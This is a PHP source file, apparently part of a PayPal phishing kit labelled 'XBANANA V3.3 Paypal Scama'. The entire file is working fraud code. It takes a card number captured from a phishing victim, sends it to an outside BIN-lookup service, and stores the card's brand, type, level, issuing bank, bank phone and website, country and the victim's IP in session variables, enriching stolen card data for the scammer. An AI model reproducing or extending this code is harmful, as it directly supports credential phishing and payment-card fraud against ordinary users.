<?php
//XBANANA V3.3 Paypal Scama                                                   
//XBANANA V3.3 Paypal Scama 
//XBANANA V3.3 Paypal Scama 
//XBANANA V3.3 Paypal Scama 
//XBANANA V3.3 Paypal Scama 
//XBANANA V3.3 Paypal Scama 
//XBANANA V3.3 Paypal Scama 
//XBANANA V3.3 Paypal Scama 
//XBANANA V3.3 Paypal Scama 
//----------------------------------
//*Golden Dragon Escrow <3 (o)(o) ç--8

session_start();
//////////////////////////////////////////////////////////////////
$BIN_LOOKUP  = str_replace(' ', '', $_SESSION['_cardnumber_']);
$xBanana_BIN    = @json_decode(file_get_contents("https://lookup.binlist.net/".$BIN_LOOKUP.""));
$BIN_CARD    = $xBanana_BIN->scheme;
$BIN_BANK    = $xBanana_BIN->bank -> name;
$BIN_TYPE    = $xBanana_BIN->type;
$BIN_LEVEL   = $xBanana_BIN->brand;
$BIN_CNTRCODE= $xBanana_BIN->country -> alpha2;
$BIN_WEBSITE = $xBanana_BIN->bank -> url;
$BIN_PHONE   = $xBanana_BIN->bank -> phone;
$BIN_COUNTRY = $xBanana_BIN->country -> name;
//////////////////////////////////////////////////////////////////
$_SESSION['_country_']  = $BIN_COUNTRY;
$_SESSION['_cntrcode_'] = $BIN_CNTRCODE;
$_SESSION['_cc_brand_'] = $BIN_CARD;
$_SESSION['_cc_bank_']  = $BIN_BANK;
$_SESSION['_cc_type_']  = $BIN_TYPE;
$_SESSION['_cc_class_'] = $BIN_LEVEL;
$_SESSION['_cc_site_']  = $BIN_WEBSITE;
$_SESSION['_cc_phone_'] = $BIN_PHONE;
$_SESSION['_ccglobal_'] = $_SESSION['_cc_brand_']." ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_bank_'];
$_SESSION['_global_']   = $_SESSION['_cntrcode_']." - ".$_SESSION['_ip_'];
///////////////////////////////// BIN Lookup /////////////////////////
?>